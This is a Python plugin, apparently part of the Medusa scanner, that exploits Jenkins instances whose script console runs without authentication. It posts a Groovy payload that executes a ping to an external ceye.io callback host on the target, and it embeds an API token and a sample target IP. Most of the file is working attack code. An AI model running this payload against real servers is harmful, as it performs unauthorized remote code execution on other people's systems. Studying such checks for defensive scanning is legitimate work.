#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__ = 'Ascotbe'
__date__ = '2019/10/13 22:12 PM'
import urllib.parse
import requests
import time
import re
import random
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number'] = "0"  # 如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-11-11"  # 插件编辑时间
        self.info['disclosure']='2019-11-11'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "JenkinsConfigurationErrorCausesUnauthorizedCodeExecutionVulnerability"  # 插件名称
        self.info['name'] ='Jenkins配置错误导致未经授权的代码执行漏洞' #漏洞名称
        self.info['affects'] = "Jenkins"  # 漏洞组件
        self.info['desc_content'] = "Jenkins当用户勾选任意用户有代码执行的权利的话会导致漏洞产生"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "关闭选项设置，改成需要登录才能执行代码"  # 修复建议
        self.info['version'] = "全版本"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

def ranstr(num):#生成随机字符串
    H = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

    salt = ''
    for i in range(num):
        salt += random.choice(H)

    return salt
def medusa(Url,RandomAgent,ProxyIp=None):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    ran = ranstr(10)
    post_data = '''script%3dprintln+%22ping+%7b%7d.mdtx4t.ceye.io%22.execute().text%26Jenkins-Crumb%3d32bfdadca3609e1e2f8e8414a0f363c16dd4115eb4e6af6305f2383a0ae40610%26json%3d%7b%22script%22%3a+%22println+%5c%22ping+%7b%7d.mdtx4t.ceye.io%5c%22.execute().text%22%2c+%22%22%3a+%22%22%2c+%22Jenkins-Crumb%22%3a+%2232bfdadca3609e1e2f8e8414a0f363c16dd4115eb4e6af6305f2383a0ae40610%22%7d%26Submit%3d%e8%bf%90%e8%a1%8c'''.format(
        ran, ran)
    payload = "/script"

    try:
        payload_url = scheme + "://" + url + ':' + str(port) + payload
        s = requests.session()
        cookises=re.compile('.*Cookie (.*) for.*').findall(str(s.get(payload_url).cookies))[0]#正则匹配获取的Cookie字符串
        headers = {
            'User-Agent': RandomAgent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Cookis':cookises
        }

        # if ProxyIp!=None:
        #     proxies = {
        #         # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
        #         "http": "http://" + str(ProxyIp)
        #     }
        #     resp = s.post(payload_url,headers=headers,data=post_data, timeout=6, proxies=proxies,verify=False)
        # elif ProxyIp==None:
        resp = s.post(payload_url,headers=headers, data=post_data,timeout=6, verify=False)

        dnslog='http://api.ceye.io/v1/records?token=2e01a5af9e65acf90a94597fce586b49&type=http&filter='
        time.sleep(5)
        resp2 = requests.get(dnslog, timeout=5, verify=False)
        con = resp.text
        con2 = resp2.text
        if con.find(ran)!=-1 :
            Medusa = "{}Jenkins配置不当导致未授权代码执行漏洞\r\n漏洞详情:\r\nPayload:{}\r\n返回数据包:{}\r\nDNSlog{}\r\n".format(url, payload_url,con,con2)
            _t=VulnerabilityInfo(Medusa)
            web=ClassCongregation.VulnerabilityDetails(_t.info)
            web.High() # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
            return (str(Medusa))
    except:
        _ = VulnerabilityInfo('').info.get('algroup')
        _l=ClassCongregation.ErrorLog().Write(url,_)#调用写入类


#medusa('http://120.26.60.154:8080','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/4')